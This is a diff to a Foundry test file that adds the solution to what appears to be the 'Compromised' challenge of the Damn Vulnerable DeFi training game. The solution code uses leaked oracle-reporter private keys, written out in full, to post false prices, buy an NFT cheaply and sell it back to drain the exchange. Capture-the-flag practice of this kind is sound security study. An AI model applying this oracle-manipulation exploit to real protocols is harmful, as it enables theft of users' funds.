@@ -77,6 +77,48 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        /* 
+        * Solution explaination: https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-compromised-challenge-7-solution-complete-walkthrough-ea9b42c23068
+        * 1. Take the leaked hex string and convert to utf-8 using: https://onlinetools.com/utf8/convert-hexadecimal-to-utf8
+        * 2. Take the base64 output string and convert to utf-8 using: https://onlinetools.com/utf8/convert-base64-to-utf8
+        * 3. Take the output and use `cast wallet address 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48` which will 
+        reveal it is one of the authorized oracle reporter source wallets!
+        * 4. Now load the private key into a wallet instance and set the price to drain the exchange!
+        */
+
+        // private keys below found from cloudflare web leak as described above
+        uint256 pk1 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        uint256 pk2 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+
+        address signer1 = vm.addr(pk1); // oracle source address 1
+        address signer2 = vm.addr(pk2); // oracle source address 2
+
+        vm.prank(signer1);
+        trustfulOracle.postPrice("DVNFT", 1);
+
+        vm.prank(signer2);
+        trustfulOracle.postPrice("DVNFT", 1);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        vm.prank(signer1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        vm.prank(signer2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        vm.prank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        vm.prank(attacker);
+        exchange.sellOne(tokenId);
+
+        vm.prank(signer1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(signer2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         /**
          * EXPLOIT END *
          */
